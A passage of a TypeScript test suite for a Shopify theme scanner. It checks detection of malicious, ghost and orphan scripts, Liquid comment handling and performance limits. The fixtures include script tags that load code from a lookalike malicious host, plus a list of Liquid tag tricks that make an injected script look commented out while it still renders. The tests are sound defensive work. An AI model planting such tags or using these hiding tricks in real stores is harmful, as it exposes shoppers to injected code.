      String.raw`\u{` + "0".repeat(5_000_000),
      (String.raw`\u{` + "0".repeat(1000)).repeat(5000),
      String.raw`\u{00000`.repeat(625_000),
    ]) {
      expect(
        timedMinMs(() => detectMaliciousScripts({ filename: "assets/app.js", content })),
      ).toBeLessThan(1500);
    }
  }, 30_000);
});

// ---------------------------------------------------------------------------
// MALICIOUS_SCRIPT survives the oversized-file skip (gc-qqt)
// ---------------------------------------------------------------------------

describe("scanThemeFiles — MALICIOUS_SCRIPT in oversized scannable files (gc-qqt)", () => {
  const EVIL_TAG = '<script src="https://shopify.jsdeliver.cloud/config.js"></script>';
  const GHOST_TAG =
    '<script src="https://static.klaviyo.com/onsite/js/klaviyo.js?company_id=X"></script>';

  it("still flags a malicious line in a file padded past the 1MB cap, and keeps it in skippedFiles", () => {
    const content = [GHOST_TAG, EVIL_TAG, " ".repeat(MAX_SCANNABLE_FILE_BYTES + 1)].join("\n");
    const { findings, skippedFiles, unknownScripts, thirdPartyDomains } = scanThemeFiles([
      { filename: "sections/padded.liquid", content },
    ]);

    expect(skippedFiles).toEqual([{ filename: "sections/padded.liquid", size: content.length }]);
    // Only the malicious-domain pass ran: the ghost script is NOT reported.
    expect(findings).toHaveLength(1);
    expect(findings[0].findingType).toBe(FindingType.MALICIOUS_SCRIPT);
    expect(findings[0].filename).toBe("sections/padded.liquid");
    expect(findings[0].lineNumber).toBe(2);
    expect(unknownScripts).toHaveLength(0);
    expect(thirdPartyDomains).toHaveLength(0);
  });

  it("emits nothing for a clean oversized file (still skipped)", () => {
    const content = GHOST_TAG + "\n" + " ".repeat(MAX_SCANNABLE_FILE_BYTES + 1);
    const { findings, skippedFiles } = scanThemeFiles([
      { filename: "layout/theme.liquid", content },
    ]);
    expect(findings).toHaveLength(0);
    expect(skippedFiles).toHaveLength(1);
  });

  it("stays fast on a 5MB padded file (single-line and multi-line padding)", () => {
    const singleLine = EVIL_TAG + "x".repeat(5_000_000);
    const multiLine = ("// " + "a".repeat(80) + "\n").repeat(60_000) + EVIL_TAG;
    const { result, minMs } = timedMinMsWithResult(() =>
      scanThemeFiles([
        { filename: "sections/a.liquid", content: singleLine },
        { filename: "sections/b.liquid", content: multiLine },
      ]),
    );

    expect((result.skippedFiles ?? []).map((f) => f.filename)).toEqual([
      "sections/a.liquid",
      "sections/b.liquid",
    ]);
    expect(findingsOfType(result.findings, FindingType.MALICIOUS_SCRIPT)).toHaveLength(2);
    expect(minMs).toBeLessThan(3_000);
  }, 20_000);
});

// ---------------------------------------------------------------------------
// MALICIOUS_SCRIPT: Liquid-faithful comment blanking (differential audit vs the
// real Liquid 5.8.1 gem, 2026-09-23). Every "renders live" case below was
// rendered by real Liquid and printed the script; the scanner must report it.
// ---------------------------------------------------------------------------

describe("blankLiquidComments — Liquid-faithful token walk", () => {
  const EVIL = '<script src="https://jsdeliver.cloud/x.js"></script>';
  const NBSP = "\u00a0";
  const scan = (content: string) =>
    detectMaliciousScripts({ filename: "sections/x.liquid", content });

  describe("renders live in real Liquid, so it must be reported", () => {
    const LIVE_CASES: Array<[string, string]> = [
      [
        "endraw is case-sensitive: {% EndRaw %} does not close raw",
        `{% raw %}{% EndRaw %}{% comment %}${EVIL}{% endcomment %}{% endraw %}`,
      ],
      [
        "NBSP around endraw is not Liquid whitespace, raw stays open",
        `{% raw %}{%${NBSP}endraw${NBSP}%}{% comment %}${EVIL}{% endcomment %}{% endraw %}`,
      ],
      [
        "endcomment with trailing markup closes the comment",
        `{% comment %}x{% endcomment x %}${EVIL}{% comment %}{% endcomment %}`,
      ],
      [
        "doc body hides a comment opener",
        `{% doc %}{% comment %}{% enddoc %}${EVIL}{% doc %}{% endcomment %}{% enddoc %}`,
      ],
      [
        "inline # comments are single tokens and never open a block",
        `{% # {% comment %}${EVIL}{% # {% endcomment %}`,
      ],
      [
        "raw inside a comment is consumed to endraw, so its endcomment is literal",
        `{% comment %}{% raw %}{% endcomment %}{% endraw %}{% endcomment %}${EVIL}`,
      ],
      [
        "Endcomment (mixed case) inside a comment does not close it",
        `{% comment %}{% Endcomment %}{% endcomment %}${EVIL}`,
      ],
      ["comment tags inside a doc body are ignored", `{% doc %}{% comment %}{% enddoc %}${EVIL}`],
    ];
    it.each(LIVE_CASES)("%s", (_name, content) => {
      expect(scan(content)).toHaveLength(1);
    });
  });

  // Shopify-only tags (unknown to the open-source gem, so not differentially
  // verified): their bodies are not rendered as Liquid, so comment tags inside
  // them are literal text and must not hide what follows.
  it.each(["javascript", "schema", "stylesheet"])(
    "treats comment tags inside a Shopify %s block body as literal",
    (tag) => {
      const content = `{% ${tag} %}{% comment %}{% end${tag} %}${EVIL}{% ${tag} %}{% endcomment %}{% end${tag} %}`;
      expect(scan(content)).toHaveLength(1);
    },
  );

  describe("hidden in real Liquid, so it is blanked", () => {
    const HIDDEN_CASES: Array<[string, string]> = [
      ["plain comment", `{% comment %}${EVIL}{% endcomment %}`],
      ["whitespace-control tags", `{%- comment -%}${EVIL}{%- endcomment -%}`],
      ["no spaces", `{%comment%}${EVIL}{%endcomment%}`],
      ["tags split across lines", `{%\ncomment\n%}\n${EVIL}\n{%\nendcomment\n%}`],
      [
        "nested comments close on the matching endcomment",
        `{% comment %}{% comment %}{% endcomment %}${EVIL}{% endcomment %}`,
      ],
      ["comment with markup on the opener", `{% comment x %}${EVIL}{% endcomment %}`],
      ["doc body", `{% doc %}${EVIL}{% enddoc %}`],
      ["doc ignores raw inside it", `{% doc %}{% raw %}${EVIL}{% enddoc %}`],
      [
        "endraw with trailing markup closes raw",
        `{% raw %}{% endraw x %}{% comment %}${EVIL}{% endcomment %}`,
      ],
    ];
    it.each(HIDDEN_CASES)("%s", (_name, content) => {
      expect(scan(content)).toHaveLength(0);
    });
  });

  it("keeps a real comment's text blanked but live code on the same line visible", () => {
    const findings = scan(`{% comment %}${EVIL}{% endcomment %}${EVIL}`);
    expect(findings).toHaveLength(1);
    expect(findings[0].lineNumber).toBe(1);
  });

  it("leaves everything live after a Liquid parse error it can detect (raw with args, nested doc)", () => {
    expect(scan(`{% raw x %}{% endraw %}{% comment %}${EVIL}{% endcomment %}`)).toHaveLength(1);
    expect(scan(`{% doc %}{% doc %}{% enddoc %}${EVIL}{% enddoc %}`)).toHaveLength(1);
    expect(scan(`{% comment %}${EVIL}`)).toHaveLength(1);
    expect(scan(`{% comment %}${EVIL}{% endcomment`)).toHaveLength(1);
  });

  it("returns empty input unchanged and preserves length and newline offsets", () => {
    expect(blankLiquidComments("")).toBe("");
    const atoms = [
      "{% comment %}",
      "{%- endcomment -%}",
      "{%raw%}",
      "{% endraw %}",
      "{% doc %}",
      "{% enddoc %}",
      "{% # x %}",
      "{{ a }",
      "{{",
      "}}",
      "\n",
      "a",
      "\u00e9",
      "\ud83d\ude00",
      "{%",
      "%}",
      "\r\n",
      "{%\ncomment\n%}",
    ];
    let seed = 42;
    const rand = (n: number) => {
      seed = (seed * 1103515245 + 12345) % 2147483648;
      return seed % n;
    };
    const newlines = (x: string) => [...x.matchAll(/\n/g)].map((m) => m.index).join(",");
    for (let t = 0; t < 3000; t++) {
      let s = "";
      const n = rand(40);
      for (let k = 0; k < n; k++) s += atoms[rand(atoms.length)];
      const b = blankLiquidComments(s);
      expect(b.length).toBe(s.length);
      expect(newlines(b)).toBe(newlines(s));
    }
  });

  it("stays linear on 5MB adversarial token floods", () => {
    const MB5 = 5 * 1024 * 1024;
    const fill = (unit: string) => unit.repeat(Math.ceil(MB5 / unit.length)).slice(0, MB5);
    const floods: Record<string, string> = {
      commentOpeners: fill("{% comment %}"),
      endcomments: fill("{% endcomment %}"),
      rawOpeners: fill("{% raw %}"),
      docOpeners: fill("{% doc %}"),
      unterminatedTag: fill("{%"),
      unterminatedVar: fill("{{"),
      varSwallowingTag: fill("{{{%"),
      singleBrace: fill("{{ a }"),
      innerTagStarts: "{% raw %}" + fill("{% {%") + "%}",
      wsAfterTagStart: "{%" + " ".repeat(MB5) + "raw",
      deepNesting:
        fill("{% comment %}").slice(0, MB5 / 2) + fill("{% endcomment %}").slice(0, MB5 / 2),
      alternatingRawComment: fill("{% raw %}{% comment %}{% endraw %}{% endcomment %}"),
      commentWithRaw: fill("{% comment %}{% raw %}"),
      newlineMix: fill("{% comment %}\n{% raw %}\nx\n{% endcomment %}\n"),
    };
    const timed = (flood: string) => {
      const start = performance.now();
      const out = blankLiquidComments(flood);
      return { out, elapsed: performance.now() - start };
    };
    for (const [name, flood] of Object.entries(floods)) {
      const first = timed(flood);
      const second = timed(flood);
      expect(first.out.length, name).toBe(flood.length);
      // Min of two runs discards a transient stall under full-suite
      // parallelism. A quadratic regression on 5 MB costs minutes, so 5 s
      // still catches it while staying well under the 30 s worker timeout.
      expect(Math.min(first.elapsed, second.elapsed), name).toBeLessThan(5000);
    }
  }, 120_000);
});

// ---------------------------------------------------------------------------
// OS 2.0 / Horizon theme blocks get the full per-file suite (gc-zfl)
// ---------------------------------------------------------------------------

describe("scanThemeFiles — theme blocks (blocks/*.liquid, gc-zfl)", () => {
  // Abridged from Shopify's stock Horizon theme blocks. First-party theme code:
  // every one of these must scan clean (zero findings, zero unknown resources).
  const STOCK_HORIZON_BLOCKS: ThemeFile[] = [
    {
      filename: "blocks/_marquee.liquid",
      content: [
        "<script",
        "  src=\"{{ 'marquee.js' | asset_url }}\"",
        '  type="module"',
        '  fetchpriority="low"',
        "></script>",
        "",
        "{% assign block_settings = block.settings %}",
        "{% if block.settings.background_color != blank %}",
        "  {% render 'contrast-override', background_color: block.settings.background_color, section_id: block.id %}",
        "{% endif %}",
        "<marquee-component class=\"spacing-style\">{% content_for 'blocks' %}</marquee-component>",
        "{% schema %}",
        '{ "name": "t:names.marquee", "blocks": [{ "type": "@theme" }] }',
        "{% endschema %}",
      ].join("\n"),
    },
    {
      filename: "blocks/group.liquid",
      content: [
        '<div class="group-block" {{ block.shopify_attributes }}>',
        "  {% content_for 'blocks' %}",
        "</div>",
        "{% schema %}",
        '{ "name": "t:names.group", "blocks": [{ "type": "@theme" }, { "type": "@app" }] }',
        "{% endschema %}",
      ].join("\n"),
    },
    {
      filename: "blocks/review.liquid",
      content: [
        "{% liquid",
        "  assign product = closest.product",
        "  assign rating = product.metafields.reviews.rating.value.rating",
        "  if request.visual_preview_mode and product == blank",
        "    assign product = collections.all.products.first",
        "  endif",
        "-%}",
        '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><use href="#star"></use></svg>',
        "{% stylesheet %}.rating-wrapper { display: flex; }{% endstylesheet %}",
        "{% schema %}",
        '{ "name": "t:names.review", "settings": [] }',
        "{% endschema %}",
      ].join("\n"),
    },
  ];

  it("reports zero findings on stock Horizon-style blocks (first-party theme code)", () => {
    const { findings, unknownScripts, skippedFiles } = scanThemeFiles(STOCK_HORIZON_BLOCKS);
    expect(findings).toEqual([]);
    expect(unknownScripts).toEqual([]);
    expect(skippedFiles).toEqual([]);
  });

  it("detects a leftover app script (Klaviyo) inside a block as GHOST_SCRIPT", () => {
    const { findings } = scanThemeFiles([
      {
        filename: "blocks/newsletter.liquid",
        content:
          '<div>\n<script async src="https://static.klaviyo.com/onsite/js/klaviyo.js?company_id=X"></script>\n</div>',
      },
    ]);
    const ghost = findingsOfType(findings, FindingType.GHOST_SCRIPT);
    expect(ghost).toHaveLength(1);
    expect(ghost[0]).toMatchObject({
      filename: "blocks/newsletter.liquid",
      lineNumber: 2,
      appName: "Klaviyo",
    });
  });

  it("detects a render of a known app snippet (Judge.me) inside a block as GHOST_SNIPPET", () => {
    const { findings } = scanThemeFiles([
      {
        filename: "blocks/product-reviews.liquid",
        content:
          "<div class=\"reviews\">\n  {% render 'judgeme_widgets', widget_type: 'judgeme_preview_badge' %}\n</div>",
      },
    ]);
    const ghost = findingsOfType(findings, FindingType.GHOST_SNIPPET);
    expect(ghost).toHaveLength(1);
    expect(ghost[0]).toMatchObject({
      filename: "blocks/product-reviews.liquid",
      lineNumber: 2,
      appName: "Judge.me",
    });
  });

  it("collects an unknown third-party script in a block (same as sections)", () => {
    const { unknownScripts, thirdPartyDomains } = scanThemeFiles([
      {
        filename: "blocks/widget.liquid",
        content: '<script src="https://cdn.unknown-vendor.example/w.js"></script>',
      },
    ]);
    expect(unknownScripts.map((u) => [u.filename, u.url])).toEqual([
      ["blocks/widget.liquid", "https://cdn.unknown-vendor.example/w.js"],
    ]);
    expect((thirdPartyDomains ?? []).map((d) => d.domain)).toContain("cdn.unknown-vendor.example");
  });

  it("does not orphan an app-named snippet rendered only from a block", () => {
    const { findings } = scanThemeFiles([
      { filename: "snippets/judgeme_widgets.liquid", content: '<div class="jdgm-widget"></div>' },
      { filename: "blocks/reviews.liquid", content: "{% render 'judgeme_widgets' %}" },
    ]);
    expect(findingsOfType(findings, FindingType.ORPHAN_ASSET)).toHaveLength(0);
  });

  it("never reports an unreferenced block file itself as ORPHAN_ASSET", () => {
    // Blocks are placed via JSON templates / content_for, never render — an
    // unreferenced block (even an app-named one) is not an orphan signal.
    const { findings } = scanThemeFiles([
      { filename: "blocks/klaviyo-form.liquid", content: "<div>form</div>" },
    ]);
    expect(findingsOfType(findings, FindingType.ORPHAN_ASSET)).toHaveLength(0);
  });

  it("counts block content in cross-file detectors (chat widgets split across a block)", () => {
    const { findings } = scanThemeFiles([
      {
        filename: "layout/theme.liquid",
        content: '<script src="https://widget.intercom.io/widget/abc123"></script>',
      },
      {
        filename: "blocks/chat.liquid",
        content: '<script src="https://embed.tawk.to/abc/default"></script>',
      },
    ]);
    expect(findingsOfType(findings, FindingType.OVERLAPPING_CHAT_WIDGET)).toHaveLength(1);
  });

  it("size-skips an oversized block but still runs the malicious pass exactly once", () => {
    const EVIL = "https://shopify.jsdeliver.cloud/config.js";
    const filler = "<div>x</div>\n".repeat(Math.ceil((MAX_SCANNABLE_FILE_BYTES + 10) / 13));
    const content = `<script src="${EVIL}"></script>\n` + filler;
    const { findings, skippedFiles } = scanThemeFiles([
      { filename: "blocks/huge.liquid", content },
    ]);
    expect((skippedFiles ?? []).map((f) => f.filename)).toEqual(["blocks/huge.liquid"]);
    expect(findings.map((f) => f.findingType)).toEqual([FindingType.MALICIOUS_SCRIPT]);
  });

  it("stays fast on a Horizon-sized theme (120 blocks + 60 sections + 80 snippets)", () => {
    const blockBody = STOCK_HORIZON_BLOCKS.map((b) => b.content).join("\n");
    const files: ThemeFile[] = [];
    // ~20 KB each — Horizon's largest block is ~43 KB, median a few KB.
    for (let i = 0; i < 120; i++) {
      files.push({ filename: `blocks/b-${i}.liquid`, content: blockBody.repeat(20) });
    }
    for (let i = 0; i < 60; i++) {
      files.push({ filename: `sections/s-${i}.liquid`, content: blockBody.repeat(20) });
    }
    for (let i = 0; i < 80; i++) {
      files.push({ filename: `snippets/n-${i}.liquid`, content: blockBody.repeat(10) });
    }
    files.push({
      filename: "blocks/zzz.liquid",
      content: '<script src="https://static.klaviyo.com/onsite/js/klaviyo.js"></script>',
    });

    const timedScan = () => {
      const start = performance.now();
      const result = scanThemeFiles(files);
      return { result, elapsed: performance.now() - start };
    };
    const first = timedScan();
    const second = timedScan();

    expect(findingsOfType(first.result.findings, FindingType.GHOST_SCRIPT)).toHaveLength(1);
    expect(second.result.findings).toEqual(first.result.findings);
    // Catches pathological regressions (seconds PER FILE, which would push a
    // real theme into the 30 s WORKER_TIMEOUT_MS), not ms drift: this runs in
    // well under a second in isolation, but a single-shot 3 s budget flaked
    // under full-suite parallelism. The min of two runs discards a transient
    // stall; 10 s is still far below what a per-file regression would cost
    // across 261 files.
    expect(Math.min(first.elapsed, second.elapsed)).toBeLessThan(10_000);
  }, 60_000);
});
